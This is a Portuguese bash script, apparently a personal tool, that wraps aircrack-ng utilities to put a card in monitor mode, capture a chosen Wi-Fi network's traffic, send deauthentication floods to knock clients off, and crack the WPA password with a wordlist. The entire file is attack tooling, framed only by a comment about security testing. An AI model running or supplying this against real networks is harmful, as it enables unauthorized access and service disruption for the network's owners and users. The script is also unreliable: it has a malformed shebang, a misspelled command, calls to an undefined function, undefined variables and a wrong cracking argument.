#/bin/bash
# Script para automatizar testes de segurança em redes WPA/WPA2
# 
# Data: 19/07/2016 versão 0.1-0
# Autor: Joao Lucas <joaolucas@linuxmail.org>
#

INTERFACE=wlan0
INTERFACE_MON=mon0
DATA=$(date +'%d-%m-%Y-%H-%M')
ARQ_CAP=arq_$DATA.cap
WORD_LIST=/home/joao/wpa.txt

menu(){
	echo "1. Ativar modo monitoramento" 
	echo "2. Iniciar captura de pacotes"
	echo "3. Injetar pacotes"
	echo "4. Quebrar senha"
	echo "99. Sair"
	read -p "> Opção:" opt

	case $opt in
		1) monitoramento ;;
		2) capturar_pacotes ;;
		3) deauth ;; 
		3) injetar_pacotes ;;
		4) quebrar_senha ;;
		99) echo "Saindo..."; sleep 2; exit 0 ;; 
		*) echo "Opção invalida!"; menu ;;
esac	
}

# ATIVAR MODO MONITORAMENTO
monitoramento(){
	airmon-ng start $INTERFACE
	if [ $? -eq 0 ]
	then
		echo "[ OK ] Modo monitoramento ativo!"
	else
		echo "[ FALHA ] Ocorreram erros em ativar modo monitoramento!"
		echo "~ Verifique se a interface de rede esta correta!"
	fi
}

# INICIAR CAPTURA DE PACOTES
capturar_pacotes(){
	airodump-ng $INTERFACE_MON
	echo -e "\n Escolha a rede desejada!"
	read -p "ESSID: " ESSID
	read -p "BSSID: " BSSID
	read -p "CHANNEL: " CHANNEL 
	echo "Iniciando captura de pacotes na rede $ESSID"
	airodump-ng --bssid $BSSID --channel $CHANNEL --write $ARQ_CAP
	if [ $? -eq 0 ]
	then
		echo "[ OK ] Captura de pacotes da rede $ESSID executado com sucesso!"
		echo "~ Salvando em: $ARQ_CAP"	
	else
		echo "[ FALHA ] Ocorreram erros em capturar pacotes da rede $ESSID"
	fi
}

# FUNÇAO PARA FAZER DEAUTH
deauth(){
	echo "Fazendo DEAUTH"
	airplay-ng -5 -a $AP -c $CLIENT $INTERFACE_MON --ignore-negative-one 
	if [ $? -eq 0 ]
	then
		echo "[ OK ] DEAUTH realizado com sucesso!"
	else
	echo "[ FALHA ] Ocorreram erros em fazer DEAUTH!"
	fi
}

# FUNÇÃO PARA INJETAR PACOTES
injetar_pacotes(){
	aireplay-ng -0 50 -a $BSSID -c $CLIENT $MON
	if [ $? -eq 0 ]
	then
		echo "[ OK ] Pacotes injetados!"
	else
		echo "[ FALHA ] Ocorreram erros em injetar pacotes!"
	fi
}

quebrar_senha(){
# quebrar senha
	aircrack-ng $BSSID -w $WORD_LIST 
}

while true
do
	if [$UID -eq 0]
	then
		clear
		main
	else
		echo "Executar script como root!"
		sleep 3
		exit 0
	fi
done
